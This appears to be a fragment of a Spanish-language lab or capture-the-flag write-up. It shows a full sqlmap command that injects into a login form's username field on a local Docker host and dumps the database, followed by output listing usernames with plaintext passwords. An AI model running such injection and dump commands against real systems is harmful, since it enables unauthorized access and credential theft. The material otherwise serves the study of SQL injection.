sqlmap -u "http://172.17.0.2/bills/" \
  --data="username=*&passwor=fht" \
  --cookie="PHPSESSID=dkoin5nnl92q4f6h5u3akmlpb0" \
  -p username \
  --level=3 --risk=2 \
  --dbms=mysql \
  --dump \
  --batch
  
SQLMap detecta tres tipos de inyección en username: boolean-based blind, time-based blind y UNION query. La UNION query permite extraer datos directamente en la respuesta HTTP. Con --dump vuelca todas las tablas de la base de datos actual y --batch acepta las opciones por defecto sin interrumpir la ejecución.
Ejemplo:
		Database: register
		Table: users
		+----+-----------+----------+
		| id | passwd    | username |
		+----+-----------+----------+
		| 1  | mario123  | mario    |
		| 2  | jesus2026 | jesus    |
		| 3  | admin123  | admin    |
		+----+-----------+----------+

